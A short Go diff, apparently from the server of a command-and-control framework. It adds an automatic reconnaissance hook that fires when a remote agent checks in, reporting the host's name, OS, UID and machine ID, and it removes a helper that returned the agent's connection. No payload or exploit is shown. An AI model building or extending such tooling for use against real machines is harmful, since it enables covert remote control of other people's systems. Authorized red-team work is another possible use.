@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"net"
 	"sync"
 	"time"
 
@@ -127,6 +126,12 @@ func handleAgentSession(sess *Session, opts sessionOpts) {
 
 	opts.printer.Notify("[+] Agent %d ready — %s  (%s/%s  uid=%s  mid=%s)",
 		sess.ID, hello.Hostname, hello.OS, hello.Arch, hello.UID, hello.MachineID)
+
+	// Auto-recon: if the operator launched with -r/--recon, kick off a
+	// background recon immediately after the task channel is live.
+	if opts.autoRecon && opts.agentReadyCb != nil {
+		go opts.agentReadyCb(sess)
+	}
 
 	// ── Bidirectional task dispatch (encrypted) ───────────────────────────────
 
@@ -269,13 +274,3 @@ func agentTaskID(prefix, content string) string {
 	return fmt.Sprintf("%s%x%x", prefix, t, len(content))
 }
 
-// agentConn returns the net.Conn used by an agent session, or nil.
-// Used by cmdKill to close the connection gracefully.
-func agentConn(sess *Session) net.Conn {
-	sess.mu.Lock()
-	defer sess.mu.Unlock()
-	if !sess.IsAgent {
-		return nil
-	}
-	return sess.Conn
-}
